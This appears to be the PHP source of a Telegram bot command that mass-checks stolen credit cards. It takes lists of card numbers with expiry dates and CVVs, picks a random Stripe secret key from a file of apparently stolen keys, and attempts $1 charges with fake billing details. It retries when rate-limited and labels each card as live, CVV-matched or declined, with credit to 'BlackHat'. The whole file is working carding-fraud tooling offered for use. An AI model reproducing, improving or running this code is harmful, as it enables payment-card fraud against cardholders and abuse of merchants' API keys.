<?php

include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

////////////====[MUTE]====////////////
   if(strpos($message, "/amass ") === 0 && $userId == $config['adminID']){
  $userID = substr($message, 5);   
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for Result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);

        $messageidtoedit = GetStr(json_encode($messageidtoedit1), '"message_id":', ',');
            $ccList = substr($message, 7);
    $creditCards = explode("\n", $ccList);

    // Check if there are exactly 10 credit card entries
    if (count($creditCards) <= 200) {
        $responseText = '';
        foreach ($creditCards as $ccInfo) {
            $ccData = explode("|", $ccInfo);

            if (count($ccData) === 4) {
                $cc = trim($ccData[0]);
                $mes = trim($ccData[1]);
                $ano = trim($ccData[2]);
                $cvv = trim($ccData[3]);
                $f_contents = file("sk.txt"); 
                $sec = $f_contents[rand(0, count($f_contents) - 1)];

           $x = 0;  
            while (true) { 
                $f_contents = file("sk.txt"); 
                $sec = $f_contents[rand(0, count($f_contents) - 1)];
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]=gvbbnvhgvgh@gmail.com&billing_details[name]=@av7271 Mittal');
                $result1 = curl_exec($ch);
        
                if (strpos($result1, "rate_limit")) {  
                    $x++;  
                    continue; 
                    sleep(1);
                }  
                break;  
            }

            $tok1 = GetStr($result1,'id": "','"');
            $msg1 = GetStr($result1,'"message": "','"');
          
           $x = 0;  
            while (true) { 
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=@av7271 Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $msg = GetStr($result2, '"decline_code": "','"');
                
                if (strpos($result2, "rate_limit")) {  
                    $x++;  
                    continue; 
                    sleep(1);
                }  
                break;  
            }
            addTotal();
            addUserTotal($userId);
            $rcp = trim(strip_tags(GetStr($result1, '"receipt_url": "','"')));
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '', 4);

            #-----------------------------------------------------------------------------------------

            if (strpos($result1, 'Payment complete')) {
                $msg2= 'Charge 1USD ✅';
                $res= $rcp;
            }
            elseif (strpos($result2, 'Thank you') || (strpos($result2, "thank you"))) {
                $msg2= 'Charge 1USD ✅';
                $res= $rcp;
            }
            elseif (strpos($result2, "Your card has insufficient funds")) {
                $msg2= 'Insufficient Funds ✅';
                $res=  'CVV Matched ✅';
               addCVV();
              addUserCVV($userId);
              
            }
            elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))) { 
                $msg2= '3D Card ✅';
                $res=  'CVV Matched ✅';
               addCVV();
              addUserCVV($userId);
            }
            elseif(strpos($result2,'"cvc_check": "pass"')) {
                $msg2= 'Payment Cannot Be Completed';
                $res=  'CVV Matched ✅';
               addCVV();
              addUserCVV($userId);
            }
            elseif(strpos($result2,'"code": "incorrect_cvc"')) {
                $msg2= 'CVV Mismatch';
                $res=  'CCN Live ✅';
               addCCN();
              addUserCCN($userId);
            }
            elseif(strpos($result2,'"code": "incorrect_cvc"') || (strpos($result2, "Your card's security code is incorrect")) || (strpos($result2, "security code is invalid"))) {
                $msg2= 'CVV Mismatch';
                $res=  'CCN Live ✅';
               addCCN();
              addUserCCN($userId);
            }  
            elseif (strpos($result1, "transaction_not_allowed") || (strpos($result2, "Your card does not support"))) {
                $msg2= 'Transaction Not Allowed';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))) 
            {
                $ews= 'Declined ❌';
                $msg2=  'Fraudulent❌';
            }
             elseif ((strpos($result1, "Try again in a little bit")) || (strpos($result2, 
            "Try again in a little bit"))) 
            {
                $msg2= 'Try again in a little bit❌';
                $res=  'Try again in a little bit❌';
            }
            elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))) {
                $msg2= 'Expired Card❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))) {
                $msg2= 'Generic Declined❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))) {
                $msg2= 'Do Not Honor❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "Your card was declined")) || (strpos($result2, "Your card was declined"))) {
                $msg2= 'Your Card Was Declined❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, 'Your card number is incorrect')) || (strpos($result2, 'Your card number is incorrect'))) {
                $msg2= 'Card Number Is Incorrect❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, 'invalid_expiry_year')) || (strpos($result2, "Your card's expiration year is invalid"))) {
                $msg2= "Your card's expiration year is invalid❌";
                $res=  'Declined ❌';
            }
          elseif ((strpos($result1, 'invalid_expiry_month')) || (strpos($result2, "Your card's expiration month is invalid"))) {
                $msg2= "Your card's expiration month is invalid❌";
                $res=  'Declined ❌';
            }
          elseif(strpos($result1,'testmode_charges_only') || (strpos($result1, "Expired API Key provided"))) {
                 $res= "SK key revoked ❌";
                $msg2=  "SK key Expired,Donate Sk Key  ❌\n$sec";
            }
          elseif(strpos($result1,'api_key_expired')) {
                 $msg2= "SK key Expired,Donate Sk Key  ❌";
                $res=  $sec❌;
            }
            elseif(strpos($result1,'platform_api_key_expired')) {
                 $msg2= "SK key Expired,Donate Sk Key  ❌\n$sec";
                $res=  $sec❌;
            }
           
          

            #========================================================================


$responseText .= "\n<b>Card:</b> <code>$cc|$mes|$ano|$cvv</code>\n<b>Status:</b> $msg2\nBypassing -» $x\nGateway -» User Stripe Merchant\nTime -» <b>$time</b><b>s</b>\n\n";

            }
             else {
                $responseText .= "Invalid format for CC info: $ccInfo\n\n";
            }
        }

        // Send the final response
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<code>$lista</code>

<b>$responseText</b>
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href=t.me/+6T-YczOeDyYzYWNk'>BlackHat</a></b>",
                'parse_mode' => 'html',
                'disable_web_page_preview' => 'true'
            ]);
    }
      else {
        // If there are not exactly 10 credit card entries, send an error message
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "Please provide exactly 10 credit card entries separated by newlines.",
            'reply_to_message_id' => $messageidtoedit
        ]);
    }
}
   elseif(strpos($message, "/amass ") === 0 && $userId !== $config['adminID']){
     bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "Dhat teri maa kii.",
            'reply_to_message_id' => $message_id
        ]);
   }

?>
